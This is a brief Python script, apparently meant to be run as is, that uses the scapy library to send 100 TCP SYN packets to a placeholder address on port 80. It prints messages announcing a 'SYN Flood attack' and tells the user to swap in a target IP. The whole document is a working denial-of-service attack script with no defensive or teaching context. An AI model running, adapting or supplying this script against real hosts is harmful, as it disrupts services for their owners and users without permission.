from scapy.all import *

target_ip = "192.168.1.2"  # Replace with the target IP
target_port = 80  # Target port

print(f"Starting SYN Flood attack on {target_ip}:{target_port}")

for i in range(100):  # Sends 100 SYN packets
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    send(packet, verbose=False)

print("SYN Flood attack sent!")
